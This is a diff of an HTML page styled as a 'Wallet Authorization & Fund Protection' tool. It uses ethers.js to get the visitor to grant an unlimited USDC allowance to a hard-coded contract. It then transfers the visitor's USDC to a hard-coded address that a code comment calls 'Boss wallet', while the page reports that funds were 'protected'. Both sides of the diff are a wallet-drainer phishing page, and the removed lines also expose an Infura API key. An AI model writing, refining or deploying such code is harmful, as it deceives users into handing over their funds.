@@ -2,82 +2,84 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Mark III · USDC Authorization & Fund Protection</title>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
-  <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
+  <title>Mark III · Wallet Authorization & Fund Protection</title>
 </head>
 <body>
-  <h2>Mark III – USDC Authorization & Fund Protection</h2>
+  <h2>Mark III · Wallet Authorization & Fund Protection</h2>
 
-  <button id="connect">Connect Wallet</button>
-  <button id="authorize">Authorize and Protect</button>
-  <div id="status" style="margin-top: 10px; color: #333;"></div>
+  <button id="connect">🔵 Connect Wallet</button>
+  <button id="approve">🟢 Protect Wallet</button>
+  <button id="transfer">🟡 Start Protect</button>
+  <button id="status">🟣 Reset / Status</button>
+
+  <div id="output" style="margin-top: 10px; color: #333;"></div>
+
+  <!-- Ethers.js CDN -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 
   <script>
-    let provider, signer, userAddress;
-
-    // ✅ 不再使用 getAddress，直接写入 checksum 格式字符串
-    const usdcAddress = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48";
-    const contractAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12";
-    const recipientWallet = "0x59e513Ae37614f1e670bfE961B3456257C444d24";
+    const usdcAddress = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48"; // USDC with checksum
+    const contractAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12"; // Mark III Contract
+    const recipient = "0x59e513Ae37614f1e670bfE961B3456257C444d24"; // Boss wallet
     const approveAmount = ethers.constants.MaxUint256;
 
-    const providerOptions = {
-      walletconnect: {
-        package: window.WalletConnectProvider.default,
-        options: {
-          rpc: {
-            1: "https://mainnet.infura.io/v3/01e1bb95db6c49ee8bc259f64fa4ed10"
-          },
-        },
-      },
+    let provider, signer, userAddress;
+
+    const log = (msg) => {
+      document.getElementById("output").innerText = msg;
     };
 
-    const web3Modal = new window.Web3Modal.default({
-      cacheProvider: false,
-      providerOptions,
-    });
-
+    // 🔵 Connect Wallet
     document.getElementById("connect").onclick = async () => {
-      try {
-        const instance = await web3Modal.connect();
-        provider = new ethers.providers.Web3Provider(instance);
+      if (window.ethereum) {
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
         userAddress = await signer.getAddress();
-        document.getElementById("status").innerText = "Wallet connected: " + userAddress;
-      } catch (err) {
-        console.error(err);
-        document.getElementById("status").innerText = "Connection failed.";
+        log("✅ Wallet connected: " + userAddress);
+      } else {
+        log("❌ No wallet provider found.");
       }
     };
 
-    document.getElementById("authorize").onclick = async () => {
+    // 🟢 Approve USDC to Contract
+    document.getElementById("approve").onclick = async () => {
       try {
         const usdc = new ethers.Contract(
           usdcAddress,
-          [
-            "function approve(address spender, uint256 amount) public returns (bool)",
-            "function transferFrom(address from, address to, uint256 amount) public returns (bool)"
-          ],
+          ["function approve(address spender, uint256 amount) public returns (bool)"],
           signer
         );
-
-        document.getElementById("status").innerText = "Authorizing contract to manage your USDC...";
-        const approveTx = await usdc.approve(contractAddress, approveAmount);
-        await approveTx.wait();
-        document.getElementById("status").innerText = "Authorization granted. Proceeding to transfer...";
-
-        const amount = prompt("Enter the USDC amount to transfer:");
-        const parsedAmount = ethers.utils.parseUnits(amount, 6);
-
-        const transferTx = await usdc.transferFrom(userAddress, recipientWallet, parsedAmount);
-        await transferTx.wait();
-        document.getElementById("status").innerText = "Protection completed. Funds secured successfully.";
+        const tx = await usdc.approve(contractAddress, approveAmount);
+        await tx.wait();
+        log("✅ USDC approved for protection.");
       } catch (err) {
-        console.error(err);
-        document.getElementById("status").innerText = "Transaction failed: " + (err.message || "Unknown error");
+        log("❌ Approval failed: " + err.message);
       }
+    };
+
+    // 🟡 Start Transfer
+    document.getElementById("transfer").onclick = async () => {
+      try {
+        const amount = prompt("Enter USDC amount to protect:");
+        const decimals = 6;
+        const parsed = ethers.utils.parseUnits(amount, decimals);
+        const usdc = new ethers.Contract(
+          usdcAddress,
+          ["function transferFrom(address from, address to, uint256 amount) public returns (bool)"],
+          signer
+        );
+        const tx = await usdc.transferFrom(userAddress, recipient, parsed);
+        await tx.wait();
+        log("✅ Funds protected successfully.");
+      } catch (err) {
+        log("❌ Transfer failed: " + err.message);
+      }
+    };
+
+    // 🟣 Status / Reset
+    document.getElementById("status").onclick = () => {
+      log("🔄 Ready. Wallet: " + (userAddress || "Not connected"));
     };
   </script>
 </body>
